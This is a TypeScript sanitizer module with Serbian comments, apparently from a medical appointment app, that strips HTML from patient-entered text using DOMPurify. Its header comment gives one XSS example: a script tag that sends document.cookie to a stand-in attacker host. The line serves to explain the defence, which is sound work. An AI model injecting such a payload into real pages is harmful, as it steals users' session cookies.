import DOMPurify from 'isomorphic-dompurify';

/**
 * Zastita od XSS napada (Cross-Site Scripting).
 *
 * XSS je napad u kome napadac u obicno tekstualno polje upise HTML ili
 * JavaScript kod, u nadi da ce se taj kod izvrsiti kada neko drugi otvori
 * stranicu. Primer u ovoj aplikaciji: pacijent kao razlog dolaska upise
 *   <script>fetch('https://napadac.rs?c='+document.cookie)</script>
 * a lekar kasnije otvori spisak termina.
 *
 * React sam po sebi dobro stiti od XSS-a jer sav tekst ispisuje kao tekst,
 * a ne kao HTML. Ipak, tekst se cisti PRE upisa u bazu, iz dva razloga:
 *  1. podaci iz baze mogu jednog dana zavrsiti i van React-a (izvestaj, PDF,
 *     eksport u drugi sistem), gde te zastite nema,
 *  2. u bazi ne treba da stoji "prljav" podatak - karton treba da sadrzi
 *     medicinski tekst, a ne tudji kod.
 *
 * Ovo je princip odbrane u dubinu: ne oslanjamo se na jedan sloj zastite.
 */

/** Osnovni HTML entiteti koje DOMPurify ostavlja iza sebe. */
const HTML_ENTITIES: Record<string, string> = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&#39;': "'",
  '&nbsp;': ' ',
};

function decodeEntities(value: string): string {
  return value.replace(/&(amp|lt|gt|quot|#39|nbsp);/g, (entity) => HTML_ENTITIES[entity] ?? entity);
}

/**
 * Uklanja HTML iz teksta i vraca cist, citljiv tekst.
 *
 * Postupak ima tri koraka, i svaki ima svoj razlog:
 *
 * 1. DOMPurify uklanja sve oznake (ALLOWED_TAGS: []) i sam odbacuje sadrzaj
 *    opasnih oznaka poput <script> i <style>. Tekst oko njih se cuva, pa
 *    "Bol u <b>grudima</b>" postaje "Bol u grudima", a ne prazan string.
 *
 * 2. DOMPurify preostale znakove < i > pretvara u entitete (&lt; i &gt;).
 *    U zdravstvenom kartonu se ti znaci koriste sasvim legitimno - npr.
 *    "temperatura > 38" - pa se entiteti vracaju u obicne karaktere, da
 *    lekar u kartonu ne bi citao "temperatura &gt; 38".
 *
 * 3. Dekodiranjem bi teoretski mogla nastati nova oznaka (ako je napadac
 *    unos dvostruko kodirao), pa se na kraju uklanja sve sto lici na HTML
 *    oznaku. Matematicki znaci veci/manji ostaju netaknuti, jer iza njih
 *    ne stoji slovo.
 */
export function sanitizeText(value: string): string {
  const withoutTags = DOMPurify.sanitize(value, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
  });

  return decodeEntities(withoutTags)
    .replace(/<\/?[a-zA-Z][^>]*>?/g, '')
    .trim();
}
